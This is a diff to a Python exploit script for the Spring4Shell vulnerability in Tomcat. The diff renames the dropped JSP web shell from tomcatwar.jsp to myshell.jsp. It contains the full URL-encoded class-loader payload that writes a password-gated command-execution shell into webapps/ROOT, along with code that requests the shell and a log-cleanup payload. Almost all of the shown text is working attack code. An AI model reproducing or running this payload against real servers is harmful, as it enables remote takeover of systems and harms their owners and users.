@@ -24,13 +24,13 @@ class Exploit(Thread):
             "Content-Type": "application/x-www-form-urlencoded",
         }
 
-        data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
+        data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=myshell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
         # tomcat 重启之后，日志功能才能恢复,无效
         clean_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=common&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.txt&class.module.classLoader.resources.context.parent.pipeline.first.directory=logs&class.module.classLoader.resources.context.parent.pipeline.first.prefix=localhost_access_log&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
 
         try:
             self.send_post(data, headers)
-            shellurl = urljoin(self.url, 'tomcatwar.jsp')
+            shellurl = urljoin(self.url, 'myshell.jsp')
             shellgo = requests.get(shellurl,
                                    timeout=15,
                                    allow_redirects=False,
@@ -46,7 +46,7 @@ class Exploit(Thread):
             else:
                 parsedurl = urlparse(shellurl)
                 rooturl = parsedurl.scheme + "://" + parsedurl.netloc  # There is 100% a better way to do this, please make a PR if you know!
-                shellurlroot = urljoin(rooturl, 'tomcatwar.jsp')
+                shellurlroot = urljoin(rooturl, 'myshell.jsp')
                 shellgoroot = requests.get(shellurlroot,
                                            timeout=15,
                                            allow_redirects=False,
